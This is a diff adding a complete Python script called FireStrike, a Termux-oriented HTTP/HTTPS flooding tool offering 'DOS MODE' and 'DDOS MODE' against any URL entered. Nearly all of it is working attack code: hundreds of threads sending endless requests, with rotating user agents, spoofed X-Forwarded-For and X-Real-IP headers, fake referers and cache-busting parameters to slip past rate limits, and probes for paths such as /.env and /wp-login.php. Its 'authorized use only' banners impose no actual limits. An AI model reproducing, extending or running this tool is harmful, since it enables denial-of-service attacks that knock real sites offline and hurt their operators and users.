@@ -1,0 +1,685 @@
+#!/usr/bin/env python3
+"""
+FireStrike v2.1 - Termux-optimized HTTP/HTTPS Stress Testing Tool
+Author: zaid.escamillaa (Instagram)
+Authorized Penetration Testing Use Only
+"""
+
+import socket
+import ssl
+import threading
+import random
+import time
+import sys
+import os
+import signal
+from datetime import datetime, timedelta
+from urllib.parse import urlparse
+from collections import deque
+from typing import Optional, Tuple, List
+from dataclasses import dataclass
+
+# ──────────────────────────────────────────
+# COLOR SUPPORT (works perfectly in Termux)
+# ──────────────────────────────────────────
+try:
+    from colorama import init, Fore, Style
+    init(autoreset=True)
+    _HAS_COLORS = True
+except ImportError:
+    _HAS_COLORS = False
+
+try:
+    import pyfiglet
+    _HAS_FIGLET = True
+except ImportError:
+    _HAS_FIGLET = False
+
+# ──────────────────────────────────────────
+# TERMUX COMPATIBILITY CHECK
+# ──────────────────────────────────────────
+_IS_TERMUX = os.path.exists("/data/data/com.termux/files/usr/bin") or "com.termux" in os.environ.get("PREFIX", "")
+
+# ──────────────────────────────────────────
+# CONSTANTS
+# ──────────────────────────────────────────
+VERSION = "2.1"
+AUTHOR = "zaid.escamillaa"
+INSTAGRAM = "@zaid.escamillaa"
+
+# Attack state
+_RUNNING = False
+_REQUESTS_SENT = 0
+_REQUESTS_FAILED = 0
+_TOTAL_REQUESTS = 0
+_LOCK = threading.Lock()
+_ACTIVE_THREADS = 0
+_START_TIME = 0.0
+
+# Stats
+_RPS_HISTORY = deque(maxlen=10)
+_LATENCY_HISTORY = deque(maxlen=100)
+
+# ──────────────────────────────────────────
+# COLOR FUNCTIONS — ALL TAKE 1 ARGUMENT
+# ──────────────────────────────────────────
+def _c(text, color="", style=""):
+    """Apply color; returns empty string if no text and colors unavailable."""
+    if text is None:
+        text = ""
+    if _HAS_COLORS:
+        return f"{style}{color}{text}{Style.RESET_ALL}"
+    return text
+
+def R(text):    return _c(text, Fore.RED)
+def G(text):    return _c(text, Fore.GREEN)
+def Y(text):    return _c(text, Fore.YELLOW)
+def C(text):    return _c(text, Fore.CYAN)
+def M(text):    return _c(text, Fore.MAGENTA)
+def W(text):    return _c(text, Fore.WHITE)
+def B(text):    return _c(text, Fore.LIGHTBLACK_EX)
+def RB(text):   return _c(text, Fore.RED, Style.BRIGHT)
+def GB(text):   return _c(text, Fore.GREEN, Style.BRIGHT)
+def YB(text):   return _c(text, Fore.YELLOW, Style.BRIGHT)
+def CB(text):   return _c(text, Fore.CYAN, Style.BRIGHT)
+def MB(text):   return _c(text, Fore.MAGENTA, Style.BRIGHT)
+
+# EMPTY string constants for places where we just need reset
+_RESET = "\033[0m" if _HAS_COLORS else ""
+_W_SPACE = ""  # Use this instead of W() with no args
+
+def _cls():
+    os.system('clear')
+
+def _sigint_handler(sig, frame):
+    global _RUNNING
+    if _RUNNING:
+        _RUNNING = False
+        print(f"\n{R('⚠  Attack stopped by user. Draining threads...')}")
+        return
+    print(f"\n{R('Exiting.')}")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, _sigint_handler)
+
+# ──────────────────────────────────────────
+# TARGET DATA CLASS
+# ──────────────────────────────────────────
+@dataclass
+class Target:
+    host: str
+    port: int
+    path: str
+    ssl: bool
+    raw: str
+
+    @classmethod
+    def parse(cls, url):
+        if not url:
+            return None
+        if not url.startswith(("http://", "https://")):
+            url = "http://" + url
+        try:
+            parsed = urlparse(url)
+            host = parsed.hostname
+            if not host:
+                return None
+            ssl = parsed.scheme == "https"
+            port = parsed.port or (443 if ssl else 80)
+            path = parsed.path or "/"
+            if parsed.query:
+                path += "?" + parsed.query
+            return cls(host=host, port=port, path=path, ssl=ssl, raw=parsed.geturl())
+        except Exception:
+            return None
+
+# ──────────────────────────────────────────
+# USER AGENT GENERATOR
+# ──────────────────────────────────────────
+class UserAgentPool:
+    BROWSERS = [
+        {"name": "Chrome", "versions": ["120","121","122","123","124","125"], "platforms": ["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"]},
+        {"name": "Firefox", "versions": ["123","124","125","126"], "platforms": ["Windows NT 10.0; Win64; x64; rv:123.0", "Macintosh; Intel Mac OS X 10.15; rv:123.0", "X11; Ubuntu; Linux x86_64; rv:123.0"]},
+        {"name": "Safari", "versions": ["17.3","17.4","17.5"], "platforms": ["Macintosh; Intel Mac OS X 10_15_7", "iPhone; CPU iPhone OS 17_4 like Mac OS X", "iPad; CPU OS 17_4 like Mac OS X"]},
+        {"name": "Edge", "versions": ["120","121","122","123","124"], "platforms": ["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7"]},
+        {"name": "Mobile", "versions": ["120","121","122","123","124"], "platforms": ["Linux; Android 14; Pixel 8 Pro", "Linux; Android 14; Samsung SM-S24U", "Linux; Android 13; OnePlus 12"]},
+    ]
+
+    STATIC = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
+        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    ]
+
+    def get(self):
+        try:
+            browser = random.choice(self.BROWSERS)
+            ver = random.choice(browser["versions"])
+            platform = random.choice(browser["platforms"])
+
+            if browser["name"] == "Chrome":
+                return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36"
+            elif browser["name"] == "Firefox":
+                platform = platform.replace("rv:123.0", f"rv:{ver}.0")
+                return f"Mozilla/5.0 ({platform}) Gecko/20100101 Firefox/{ver}.0"
+            elif browser["name"] == "Safari":
+                if "iPhone" in platform or "iPad" in platform:
+                    return f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Mobile/15E148 Safari/604.1"
+                return f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Safari/605.1.15"
+            elif browser["name"] == "Edge":
+                return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36 Edg/{ver}.0.0.0"
+            elif browser["name"] == "Mobile":
+                return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Mobile Safari/537.36"
+        except Exception:
+            pass
+        return random.choice(self.STATIC)
+
+# ──────────────────────────────────────────
+# REQUEST BUILDER
+# ──────────────────────────────────────────
+class RequestBuilder:
+    METHODS = ["GET", "GET", "GET", "GET", "POST", "HEAD"]
+    REFERERS = [
+        "https://www.google.com/search?q=",
+        "https://www.facebook.com/",
+        "https://t.co/",
+        "https://www.reddit.com/r/",
+        "https://www.bing.com/search?q=",
+        "https://duckduckgo.com/?q=",
+        "https://www.instagram.com/",
+        "https://www.youtube.com/watch?v=",
+        "https://www.linkedin.com/feed/",
+        "",
+        "",
+    ]
+
+    PATHS = [
+        "/", "/index.html", "/index.php", "/index.htm",
+        "/home", "/about", "/contact", "/services", "/products",
+        "/login", "/admin", "/dashboard", "/profile", "/settings",
+        "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/",
+        "/api/", "/api/v1/", "/api/status", "/api/health", "/api/users",
+        "/api/data", "/api/config", "/api/auth/login",
+        "/assets/js/app.js", "/assets/css/style.css",
+        "/favicon.ico", "/robots.txt", "/sitemap.xml",
+        "/.env", "/config.php", "/phpinfo.php",
+        "/server-status", "/test.php", "/info.php",
+        "/search", "/register", "/signup", "/forgot-password",
+        "/blog", "/news", "/category/", "/tag/",
+        "/download", "/uploads/", "/images/",
+    ]
+
+    def __init__(self):
+        self._ua_pool = UserAgentPool()
+        self._path_index = 0
+        self._path_lock = threading.Lock()
+
+    def _random_ip(self):
+        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+
+    def _random_path(self):
+        with self._path_lock:
+            path = random.choice(self.PATHS)
+            if random.random() < 0.3:
+                # Use a regular static path with random param
+                path = random.choice(self.PATHS)
+                # Sometimes add a random numeric suffix
+                base = path.rstrip("/")
+                if random.random() < 0.4:
+                    path = f"{base}?_{random.randint(100000,999999)}={random.randint(1,999)}"
+            return path
+
+    def build(self, target):
+        method = random.choice(self.METHODS)
+        path = self._random_path()
+        ua = self._ua_pool.get()
+        referer = random.choice(self.REFERERS)
+        xff = self._random_ip()
+
+        headers = [
+            f"{method} {path} HTTP/1.1",
+            f"Host: {target.host}",
+            f"User-Agent: {ua}",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.9",
+            "Accept-Encoding: gzip, deflate",
+        ]
+
+        if referer:
+            headers.append(f"Referer: {referer}")
+
+        headers.append(f"X-Forwarded-For: {xff}")
+        headers.append(f"X-Real-IP: {xff}")
+        headers.append("Connection: keep-alive")
+        headers.append("Upgrade-Insecure-Requests: 1")
+        headers.append("Sec-Fetch-Dest: document")
+        headers.append("Sec-Fetch-Mode: navigate")
+        headers.append("Sec-Fetch-Site: none")
+        headers.append("Sec-Fetch-User: ?1")
+        headers.append("Cache-Control: no-cache")
+        headers.append("Pragma: no-cache")
+
+        if method == "POST":
+            headers.append("Content-Type: application/x-www-form-urlencoded")
+            body = f"_={int(time.time())}&r={random.randint(1,999999)}"
+            headers.append(f"Content-Length: {len(body)}")
+            headers.append("")
+            headers.append(body)
+        else:
+            headers.append("")
+
+        return "\r\n".join(headers).encode(), path
+
+# ──────────────────────────────────────────
+# SOCKET SENDER — Termux Optimized
+# ──────────────────────────────────────────
+class SocketSender:
+    _pools = {}
+    _pool_lock = threading.Lock()
+    _POOL_SIZE = 2
+    _CONNECT_TIMEOUT = 5
+    _SEND_TIMEOUT = 3
+    _RECV_TIMEOUT = 2
+
+    @classmethod
+    def _pool_key(cls, host, port, ssl_flag):
+        return f"{host}:{port}:{ssl_flag}"
+
+    @classmethod
+    def _create_socket(cls, host, port, ssl_enabled):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(cls._CONNECT_TIMEOUT)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+            if ssl_enabled:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+
+            sock.connect((host, port))
+            sock.settimeout(cls._SEND_TIMEOUT)
+            return sock
+        except Exception:
+            try:
+                sock.close()
+            except Exception:
+                pass
+            return None
+
+    @classmethod
+    def _get_from_pool(cls, host, port, ssl_enabled):
+        key = cls._pool_key(host, port, ssl_enabled)
+        with cls._pool_lock:
+            pool = cls._pools.get(key, [])
+            while pool:
+                sock = pool.pop()
+                try:
+                    sock.settimeout(0.1)
+                    sock.send(b"")
+                    sock.settimeout(cls._SEND_TIMEOUT)
+                    return sock
+                except Exception:
+                    try:
+                        sock.close()
+                    except Exception:
+                        pass
+            return cls._create_socket(host, port, ssl_enabled)
+
+    @classmethod
+    def _return_to_pool(cls, host, port, ssl_enabled, sock):
+        key = cls._pool_key(host, port, ssl_enabled)
+        with cls._pool_lock:
+            pool = cls._pools.setdefault(key, [])
+            if len(pool) < cls._POOL_SIZE:
+                pool.append(sock)
+            else:
+                try:
+                    sock.close()
+                except Exception:
+                    pass
+
+    @classmethod
+    def send(cls, host, port, ssl_enabled, data):
+        start = time.perf_counter()
+        sock = cls._get_from_pool(host, port, ssl_enabled)
+        if not sock:
+            return False, 0.0
+
+        try:
+            sock.sendall(data)
+            try:
+                sock.settimeout(cls._RECV_TIMEOUT)
+                sock.recv(1024)
+            except socket.timeout:
+                pass
+            except Exception:
+                pass
+
+            latency = (time.perf_counter() - start) * 1000
+            cls._return_to_pool(host, port, ssl_enabled, sock)
+            return True, latency
+
+        except Exception:
+            try:
+                sock.close()
+            except Exception:
+                pass
+            return False, (time.perf_counter() - start) * 1000
+
+    @classmethod
+    def cleanup(cls):
+        with cls._pool_lock:
+            for key, pool in cls._pools.items():
+                for sock in pool:
+                    try:
+                        sock.close()
+                    except Exception:
+                        pass
+            cls._pools.clear()
+
+# ──────────────────────────────────────────
+# PROGRESS BAR
+# ──────────────────────────────────────────
+class ProgressBar:
+    @staticmethod
+    def render(current, total, width=30):
+        if total <= 0:
+            return ""
+        pct = min(100, (current / total) * 100)
+        filled = int((pct / 100) * width)
+        bar = "█" * filled + "░" * (width - filled)
+        return f"[{C(bar)}] {GB(f'{pct:.0f}%')}"
+
+# ──────────────────────────────────────────
+# ATTACK ENGINE
+# ──────────────────────────────────────────
+class AttackEngine:
+    def __init__(self, target, threads, total_req):
+        self.target = target
+        self.thread_count = min(threads, 400)
+        self.total_requests = total_req
+        self._builder = RequestBuilder()
+
+    def _worker(self):
+        global _REQUESTS_SENT, _REQUESTS_FAILED, _RUNNING, _ACTIVE_THREADS
+
+        with _LOCK:
+            _ACTIVE_THREADS += 1
+
+        while _RUNNING:
+            with _LOCK:
+                if _TOTAL_REQUESTS > 0 and _REQUESTS_SENT >= _TOTAL_REQUESTS:
+                    _RUNNING = False
+                    break
+
+            request_data, used_path = self._builder.build(self.target)
+            success, latency = SocketSender.send(
+                self.target.host, self.target.port, self.target.ssl, request_data
+            )
+
+            with _LOCK:
+                if success:
+                    _REQUESTS_SENT += 1
+                    _LATENCY_HISTORY.append(latency)
+                else:
+                    _REQUESTS_FAILED += 1
+                    _REQUESTS_SENT += 1
+
+        with _LOCK:
+            _ACTIVE_THREADS -= 1
+
+    def _stats_display(self):
+        global _REQUESTS_SENT, _REQUESTS_FAILED, _RUNNING, _START_TIME
+
+        while _RUNNING:
+            time.sleep(0.5)
+
+            with _LOCK:
+                sent = _REQUESTS_SENT
+                failed = _REQUESTS_FAILED
+                active = _ACTIVE_THREADS
+                latency_list = list(_LATENCY_HISTORY)
+
+            elapsed = time.time() - _START_TIME
+            rps = sent / elapsed if elapsed > 0 else 0
+            avg_latency = sum(latency_list) / len(latency_list) if latency_list else 0
+            elapsed_str = str(timedelta(seconds=int(elapsed)))
+            success_rate = ((sent - failed) / sent * 100) if sent > 0 else 0
+
+            # Save cursor, hide it
+            sys.stdout.write("\033[s\033[?25l")
+            sys.stdout.flush()
+
+            print()
+            print(f"  {CB('╔══════════════════════════════════════════════════════════╗')}")
+            print(f"  {CB('║')}   {RB('⚠  FIRESTRIKE v' + VERSION + ' — STRESS TEST IN PROGRESS')}          {CB('║')}")
+            print(f"  {CB('╠══════════════════════════════════════════════════════════╣')}")
+            print(f"  {CB('║')}  {Y('Target:')}    {W(self.target.host + ':' + str(self.target.port))} {'🔒' if self.target.ssl else '🔓'}                    {CB('║')}")
+            print(f"  {CB('║')}  {Y('Elapsed:')}   {W(elapsed_str)}                              {CB('║')}")
+            print(f"  {CB('║')}  {Y('Requests:')}  {W(str(sent))} total | {G(str(sent - failed))} OK | {R(str(failed))} FAIL           {CB('║')}")
+            print(f"  {CB('║')}  {Y('Rate:')}      {GB(f'{rps:.1f}')} {W('req/s')} | {Y('Avg Latency:')} {GB(f'{avg_latency:.1f}')} {W('ms')}        {CB('║')}")
+            print(f"  {CB('║')}  {Y('Threads:')}   {W(str(active))} active                     {CB('║')}")
+            print(f"  {CB('║')}  {Y('Success:')}   {GB(f'{success_rate:.1f}%')}                               {CB('║')}")
+
+            if _TOTAL_REQUESTS > 0:
+                bar = ProgressBar.render(sent, _TOTAL_REQUESTS)
+                print(f"  {CB('║')}  {Y('Progress:')}  {bar}                  {CB('║')}")
+
+            print(f"  {CB('╚══════════════════════════════════════════════════════════╝')}")
+            print(f"  {R('Press Ctrl+C to stop')}")
+            print()
+
+            # Restore cursor, show it
+            sys.stdout.write("\033[u\033[?25h")
+            sys.stdout.flush()
+
+            if not _RUNNING:
+                break
+
+    def run(self):
+        global _RUNNING, _REQUESTS_SENT, _REQUESTS_FAILED, _TOTAL_REQUESTS, _START_TIME
+
+        _REQUESTS_SENT = 0
+        _REQUESTS_FAILED = 0
+        _RUNNING = True
+        _TOTAL_REQUESTS = self.total_requests
+        _START_TIME = time.time()
+        _LATENCY_HISTORY.clear()
+
+        print()
+        print(f"  {RB('┌────────────────────────────────────────────────────────┐')}")
+        print(f"  {RB('│')}  {CB('ATTACK CONFIGURATION')}                               {RB('│')}")
+        print(f"  {RB('├────────────────────────────────────────────────────────┤')}")
+        print(f"  {RB('│')}  {Y('Target:')}     {W(self.target.host)}:{GB(str(self.target.port))} ({'HTTPS' if self.target.ssl else 'HTTP'})          {RB('│')}")
+        print(f"  {RB('│')}  {Y('Threads:')}    {W(str(self.thread_count))}                              {RB('│')}")
+        print(f"  {RB('│')}  {Y('Requests:')}   {W('∞ (infinite)' if self.total_requests == 0 else str(self.total_requests))}                  {RB('│')}")
+        print(f"  {RB('│')}  {Y('Platform:')}   {W('Termux (Android)' if _IS_TERMUX else 'Linux/Unix')}                {RB('│')}")
+        print(f"  {RB('└────────────────────────────────────────────────────────┘')}")
+        print()
+
+        threads = []
+        for i in range(self.thread_count):
+            t = threading.Thread(target=self._worker, daemon=True)
+            t.start()
+            threads.append(t)
+
+        try:
+            self._stats_display()
+        except Exception:
+            pass
+        finally:
+            _RUNNING = False
+            for t in threads:
+                t.join(timeout=2)
+            SocketSender.cleanup()
+
+        elapsed = time.time() - _START_TIME
+        sent = _REQUESTS_SENT
+        failed = _REQUESTS_FAILED
+        rps = sent / elapsed if elapsed > 0 else 0
+
+        print()
+        print(f"  {GB('┌────────────────────────────────────────────────────────┐')}")
+        print(f"  {GB('│')}  {RB('✓ ATTACK COMPLETE — FINAL STATISTICS')}                {GB('│')}")
+        print(f"  {GB('├────────────────────────────────────────────────────────┤')}")
+        print(f"  {GB('│')}  {Y('Total Sent:')}  {W(str(sent))}                                {GB('│')}")
+        print(f"  {GB('│')}  {Y('Successful:')} {G(str(sent - failed))} ({GB(f'{((sent-failed)/sent*100) if sent else 0:.1f}%')})                   {GB('│')}")
+        print(f"  {GB('│')}  {Y('Failed:')}     {R(str(failed))}                                 {GB('│')}")
+        print(f"  {GB('│')}  {Y('Avg Rate:')}   {GB(f'{rps:.1f}')} {W('req/s')}                             {GB('│')}")
+        print(f"  {GB('│')}  {Y('Duration:')}   {W(str(timedelta(seconds=int(elapsed))))}                        {GB('│')}")
+        print(f"  {GB('└────────────────────────────────────────────────────────┘')}")
+        print()
+
+        input(f"{W('Press Enter to return to menu...')}")
+
+# ──────────────────────────────────────────
+# UI FUNCTIONS
+# ──────────────────────────────────────────
+def show_banner():
+    _cls()
+
+    if _HAS_FIGLET:
+        try:
+            custom_fig = pyfiglet.Figlet(font="big", width=80)
+            banner = custom_fig.renderText("FireStrike")
+            print(R(banner))
+        except Exception:
+            _fallback_banner()
+    else:
+        _fallback_banner()
+
+    print(f"  {C('══════════════════════════════════════════════════════════')}")
+    print(f"  {Y('🔥 Author:')}  {W(AUTHOR)}  {Y('|')}  {M('IG:')} {W(INSTAGRAM)}")
+    print(f"  {Y('🔥 Version:')} {W('v' + VERSION)}  {Y('|')}  {M('Type:')} {W('HTTP/HTTPS Stress Testing')}")
+    print(f"  {Y('🔥 Platform:')} {W('Termux-ready ✓' if _IS_TERMUX else 'Linux/Mac/Unix')}")
+    print(f"  {R('🔥 LEGAL: AUTHORIZED PENETRATION TESTING ONLY')}")
+    print(f"  {C('══════════════════════════════════════════════════════════')}")
+    print()
+
+def _fallback_banner():
+    print(R("""
+    █████████████████████████████████████████████████████████████
+    ██                                                         ██
+    ██              ███████ ██ ██████  ███████ ███████          ██
+    ██              ██      ██ ██   ██ ██      ██               ██
+    ██              █████   ██ ██████  █████   ███████          ██
+    ██              ██      ██ ██   ██ ██           ██          ██
+    ██              ██      ██ ██   ██ ███████ ███████          ██
+    ██                                                         ██
+    ██            STRESS TESTING TOOL — v""" + VERSION + """                   ██
+    ██                                                         ██
+    █████████████████████████████████████████████████████████████
+    """))
+
+def show_credits():
+    _cls()
+    print()
+    print(f"  {RB('══════════════════════════════════════════════════════════')}")
+    print(f"  {RB('██')}                                                 {RB('██')}")
+    print(f"  {RB('██')}           {W('FIRESTRIKE v' + VERSION)}                   {RB('██')}")
+    print(f"  {RB('██')}           {W('HTTP/HTTPS Stress Testing')}               {RB('██')}")
+    print(f"  {RB('██')}                                                 {RB('██')}")
+    print(f"  {RB('██')}  {Y('Created by:')}   {W(AUTHOR)}                    {RB('██')}")
+    print(f"  {RB('██')}  {Y('Instagram:')}    {M(INSTAGRAM)}                    {RB('██')}")
+    print(f"  {RB('██')}  {Y('Version:')}      {W('v' + VERSION)}                        {RB('██')}")
+    print(f"  {RB('██')}                                                 {RB('██')}")
+    print(f"  {RB('██')}  {R('⚠  FOR AUTHORIZED USE ONLY')}                    {RB('██')}")
+    print(f"  {RB('██')}  {R('Unauthorized use is illegal and unethical.')}     {RB('██')}")
+    print(f"  {RB('██')}                                                 {RB('██')}")
+    print(f"  {RB('══════════════════════════════════════════════════════════')}")
+    print()
+    input(f"{W('Press Enter to return...')}")
+
+def get_int_input(prompt, default, min_v, max_v):
+    while True:
+        try:
+            raw = input(f"{C('[?]')} {Y(prompt)} {B('[')}{W(str(min_v) + '-' + str(max_v))}{B(', default: ')}{W(str(default))}{B(']')}: ")
+            if not raw.strip():
+                return default
+            val = int(raw)
+            if val < min_v:
+                print(f"  {R('Minimum is ' + str(min_v) + ', using ' + str(min_v))}")
+                return min_v
+            if val > max_v:
+                print(f"  {Y('Capping at ' + str(max_v))}")
+                return max_v
+            return val
+        except ValueError:
+            print(f"  {R('Invalid — enter a number.')}")
+
+def get_target_input():
+    print()
+    raw = input(f"{C('[?]')} {Y('Enter target URL')} {B('(e.g., example.com:8080)')}: ")
+    target = Target.parse(raw)
+    if not target:
+        print(f"  {R('✗ Invalid target. Use domain.com, domain.com:8080, or https://domain.com')}")
+        return None
+
+    print(f"  {G('✓ Target resolved:')} {W(target.host)}:{GB(str(target.port))} {'🔒 HTTPS' if target.ssl else '🔓 HTTP'}")
+    return target
+
+# ──────────────────────────────────────────
+# MAIN MENU
+# ──────────────────────────────────────────
+def run_attack_flow(attack_name):
+    target = get_target_input()
+    if not target:
+        return
+
+    print()
+    threads = get_int_input("Thread count:", 100, 1, 400)
+    total = get_int_input("Total requests (0 = infinite):", 0, 0, 9999999)
+
+    print(f"\n  {Y('Launching ' + attack_name + '...')}")
+    time.sleep(0.5)
+
+    engine = AttackEngine(target, threads, total)
+    engine.run()
+
+def main_menu():
+    while True:
+        show_banner()
+
+        print(f"  {GB('[1]')}  {RB('DOS MODE')}      {B('- Single-device connection flood')}")
+        print(f"  {GB('[2]')}  {RB('DDOS MODE')}     {B('- Multi-threaded aggressive flood')}")
+        print(f"  {GB('[3]')}  {Y('CREDITS')}       {B('- About & developer info')}")
+        print(f"  {GB('[4]')}  {R('EXIT')}          {B('- Quit FireStrike')}")
+        print()
+
+        choice = input(f"  {C('[?]')} {Y('Select')} {B('(1-4)')}: ")
+
+        if choice == "1":
+            run_attack_flow("DOS Mode")
+        elif choice == "2":
+            run_attack_flow("DDOS Mode")
+        elif choice == "3":
+            show_credits()
+        elif choice == "4":
+            print(f"\n  {R('Exiting FireStrike...')}")
+            print(f"  {C('Follow')} {M(INSTAGRAM)} {C('on Instagram for updates.')}")
+            print()
+            sys.exit(0)
+        else:
+            print(f"  {R('Invalid option — choose 1-4.')}")
+            time.sleep(1)
+
+# ──────────────────────────────────────────
+# ENTRY POINT
+# ──────────────────────────────────────────
+if __name__ == "__main__":
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print(f"\n{R('Exiting FireStrike...')}")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n{R('Fatal error:')} {W(str(e))}")
+        sys.exit(1)
